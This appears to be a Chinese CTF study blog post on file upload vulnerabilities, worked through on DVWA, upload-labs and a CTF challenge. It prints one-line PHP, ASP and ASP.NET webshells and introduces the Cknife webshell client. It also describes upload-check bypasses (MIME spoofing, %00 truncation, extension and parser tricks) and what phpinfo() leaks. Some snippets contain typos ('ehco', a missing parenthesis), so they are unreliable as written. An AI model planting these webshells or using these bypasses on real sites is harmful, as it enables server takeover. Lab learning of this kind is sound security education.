---
title: WEB入门（三）
date: 2018-07-06 09:04:22
tags: [ctf, web]
---

今天学姐主要讲了文件上传漏洞，了解了 Cknife 等工具的使用。

<!-- more -->

# 文件上传漏洞

上传的文件不进行限制，有可能会被利用于上传可执行文件、脚本到服务器上，并且通过脚本文件可以获得执行服务器端命令的能力

## 木马

根据语言分类，有 PHP、ASP、JSP、ASP.NET 等不同语言下的木马；根据作用分类，有大马和小马。

PHP 一句话木马：

- `<?php ehco shell_exec($_GET['a']); ?>`
- `<?php ehco shell_exec($_POST['a']); ?>`
- `<?php @eval($_POST['a']); ?>`

ASP 一句话木马：

- `<%eval request("Cknife")%>`

ASP.NET 一句话木马：

- `<%@ Page Language="Jscript"%><%eval(Request.Item["Cknife"],"unsafe");%>`

## 利用函数

1. `shell_exec()`：通过环境执行命令，并且将完整的输出以字符串的方式返回。
2. `eval()`：把字符串作为 PHP 代码执行执行 a 接收到的内容。

## phpinfo()

|   介绍   |         内容         |
| :------: | :------------------: |
|   语法   | `int phpinfo(void);` |
|  返回值  |         整数         |
| 函数种类 |     PHP 系统功能     |

`phpinfo()` 会泄漏很多敏感的信息。

1. 绝对路径（`_SERVER["script_FILENAME"]`）

找到 `phpinfo()` 可以直接找到网站的绝对路径。

2. 支持的程序

可以查看一些特殊的程序服务，诸如 redis、memcache、mysql、SMTP、curl。要是服务器装了 redis 或者 memcache，就可以通过 ssrf 来 getshell。

3. 泄漏真实 ip（`_SERVER["SERVER_ADDR"]` 或者 `SERVER_ADDR`）

得到的 ip 可以直接用来查旁站和 c 段。

4. GOPHER

如果支持 gopher 也能直接用 ssrf。

5. fastcgi

查看是否开启 fastcgi 和查看 fastcgi 的版本，可能导致解析漏洞、远程命令执行、任意文件读取等问题。

6. 泄漏缓存文件地址（`_FILES["file1"]`）

向 `phpinfo()` post 一个 shell 后，可以在 `_FILE["file1"]` 中看到上传的临时文件，如果有个 LFI，便可以直接 getshell。

7. 一些敏感配置

- `allow_url_include`：远程文件包含
- `disable_functions`：查看金庸函数
- `open_basedir`：读取一些没权限的目录

还能获取一些环境信息，如 environment 中的 path、log 等。

## Linux 基本命令

- ls：列出当前目录下所有文件
- pwd：查看文件当前目录

# Cknife（菜刀）

超级强大的网站管理工，分为客户端和代码两部分

只要将那简短的一句话代码放到网站上去就可以取得网站的权限

运行环境：安装了 `JRE1.7+` 环境的所有操作系统

主要功能：文件管理、虚拟终端、数据库管理

## DVWA 之 File Upload

low level 的测试一下，源码中没有对任何文件格式进行过滤：

1. 写出一句话木马

用菜刀连接的一句话木马：

```php
<?php @eval($_POST['a']; ?>
```

直接在网页下通过 GET 的一句话木马：

```php
<?php echo shell_exec($_GET['a']); ?>
```

在网页下用 hackbar 通过 POST 的一句话木马：

```php
<?php echo shell_exec($_POST['a']); ?>
```

2. 上传一句话木马直接在网页查到文件

![](/pics/WEB集训/三/1.png)

![](/pics/WEB集训/三/2.png)

1. Cknife 连接

![](/pics/WEB集训/三/3.png)

源码：

```php
 <?php
    if (isset($_POST['Upload'])) {
            $target_path = DVWA_WEB_PAGE_TO_ROOT."hackable/uploads/";
            //上传路径为../../hackable/uploads/
            $target_path = $target_path . basename( $_FILES['uploaded']['name']);
            //上传路径加上上传的文件名
            if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) {
            //对是否上传成功做出判断，因此所有格式的文件都能上传
                echo '<pre>';
                echo 'Your image was not uploaded.';
                echo '</pre>';
              } else {
                echo '<pre>';
                echo $target_path . ' succesfully uploaded!';
                echo '</pre>';
            }
        }
?>
```

# 文件上传漏洞检测

- 客户端 javascript 检测：通常在本地检测文件的扩展名
- 服务端 MIME 类型检测：通常检测的是 Content-Type 内容
- 服务端目录路径检测：通常根 path 参数相关的内容
- 服务端文件扩展名检测：通常检测跟文件 extension 相关的内容
- 服务端文件内容检测：检测文件内容是否合法或含有恶意代码

## 客户端 javascript 检测

在客户端使用 js 对不合法图片进行检查

绕过：

- 禁用页面 js
- 先把文件改成符合条件的文件格式上传，在抓包，修改文件的后缀名

## 服务端检测绕过（MIME 类型检测）

通过判断 `$_FILES['userfile']['type']!="imgae/gif"` 来保证上传的文件类型为 gif

绕过：通过 burp 抓包，将原来的 Content-Type 类型改为符合要求的类型

```
Content-Type: application/octet-stream
```

`application/octet-stream` 即为 php 文件的文件类型格式

## 服务端目录路径检测

上传路径为 `/image/20160704` 时，可以通过修改为 `image/20160704/eval.php%00filename.gif`

通过 %00 截断最终导致存储的文件名为 `eval.php`

## 服务端文件扩展名检测

分为黑名单检测和白名单检测

### 黑名单检测

接收上传的文件做对比，如果匹配到黑名单中的后缀名，则不允许上传

绕过：

- 后缀名大小写绕过，例如：将 Burpsuite 截获的数据包中的文件名 `evil.php` 改 `evil.php`
- 名单列表绕过，尝试使用非黑名单内的后缀名，如 php5，php7 等
- 特殊文件名绕过（只适用 windows，将文件名改为 `evil.php.` 或 `evil.php`（注意这里有一个空格)。在 windows 下，不允许这样的命名，所以会将.和空格自动去掉）。
- 0x00 截断绕过：在上传的时候，当文件系统读到 0x00 时，会认为文件已经结束。例如：`1.php%00.jpg`，验证扩展名是 `.jpg`，但写入的时候是 `1.php` 文件

### 白名单检测

接收上传的文件做扩展名匹配，匹配上的白名单中的扩展名的文件才能上传

绕过：

- 0x00 阶段绕过
- 解析漏洞绕过
  - （1）apache 解析文件名是从右到左识别扩展名，如 `eval.php.jpg`，文件为 php 文件，不能解析 jpg 会向前解析 php
  - （2）IIS6.0 目录名包含 `.asp、.asa、.cer` 的话，则该目录下的所有文件都将按照 asp 解析。
  - （3）IIS6.0 不解析;后面的，所以提交 `evil.asp;.html` 解析为 asp 类型
  - （4）Nginx 解析漏洞：将 php 文件换成其他可以通过的文件后缀，访问的时候在后面加上 `eval.php.jpg`，如 `evil.jpg/.php`，`evil.jpg` 会解析为 php 的格式

## 服务端文件内容检测

- 图像类文件内容检测
- 文件幻数检测（图片头格式检测）
  - jpg 内容头 value = `FF D8 FF E0 00 10 4A 46 49 46`
  - gif 内容头 value = `47 49 46 38 39 61`
  - png 内容头 value = `89 50 4E 47`

绕过：在文件头后加上一句话木马就能绕过

# Upload-Labs

分别对客户端 javascript 检测、服务端 MIME 类型检测、服务端目录路径检测三种不同类型的绕过进行练习。

这里有个坑。经过潘大佬的测试，上传文件超过了文件大小 `php.ini` 中即系统设定的大小。`php.ini` 中的配置原本为 `upload_max_filesize = 2M`，修改为 `upload_max_filesize = 20M`。然后就可以上传文件了。

## pass-01

源码：

```js
function checkFile() {
  var file = document.getElementsByName("upload_file")[0].value;
  if (file == null || file == "") {
    alert("请选择要上传的文件!");
    return false;
  }
  //定义允许上传的文件类型
  var allow_ext = ".jpg|.png|.gif";
  //提取上传文件的类型
  var ext_name = file.substring(file.lastIndexOf("."));
  //判断上传文件类型是否允许上传
  if (allow_ext.indexOf(ext_name + "|") == -1) {
    var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;
    alert(errMsg);
    return false;
  }
}
```

可以知道此处的过滤是通过 javascript 实现的，在开发者工具中禁用 js 就可以上传木马

![](/pics/WEB集训/三/4.png)

## pass-02

源码：

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists($UPLOAD_ADDR)) {
        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) {
                $img_path = $UPLOAD_ADDR . $_FILES['upload_file']['name'];
                $is_upload = true;
            }
        } else {
            $msg = '文件类型不正确，请重新上传！';
        }
    } else {
        $msg = $UPLOAD_ADDR.'文件夹不存在,请手工创建！';
    }
}
```

这里对文件 MIME 类型进行了限制，只需要用 burpsuite 抓包后，将 `Content-Type` 修改为 `image/jpeg` 或 `image/gif` 或 `image/png`，放包后上传成功

![](/pics/WEB集训/三/5.png)

## pass-11

源码：

```php
$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;

        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        }
        else{
            $msg = '上传失败！';
        }
    }
    else{
        $msg = "只允许上传.jpg|.png|.gif类型文件！";
    }
}
```

这里由于有 jpg、png、gif 的白名单，需要想办法绕过。然后在接收到文件后还会对文件修改名字并最后存为相应格式的文件。故这里先将上传的文件修改为白名单中的格式，再把文件最后存储的位置通过 %00 对后面的后缀名截断

![](/pics/WEB集训/三/6.png)

# 实验吧之上传绕过

bypass the upload
格式：flag{}
[解题链接](http://ctf5.shiyanbar.com/web/upload/)

## 0x00 截断上传

```php
<%
path="upfiles/picture/"
file="20180321.jpg"
upfilename=path & file '最后的上传地址
%>
```

`upfilename` 即为最终名字，意思为如果地址为 `picture/1.php+`，文件名为 `1.jpg` 则最终上传上去的文件路径为 `picture/1.php+1.jpg`。0x00 截断的思路即为将+之后的内容忽略掉使上传文件 `1.jpg` 最终上传到 `1.php` 中。

先随便上传一个图片文件，提示需要上传 php 文件。同样上传 php 文件，提示需要上传其他格式文件。

![](/pics/WEB集训/三/7.png)

这里就需要用到 0x00 截断。提交图片后使用 burpsuite 抓包，在 `/uploads/` 后面加上 `1.php+`。

![](/pics/WEB集训/三/8.png)

然后在 hex 里把 `+` 对应的十六进制改为 `00`。

![](/pics/WEB集训/三/9.png)

修改完成后得到 flag。

# 参考网站

http://www.php.cn/php-weizijiaocheng-359309.html
https://blog.csdn.net/zhanghw0917/article/details/46793847
https://www.cnblogs.com/bmjoker/p/9141322.html
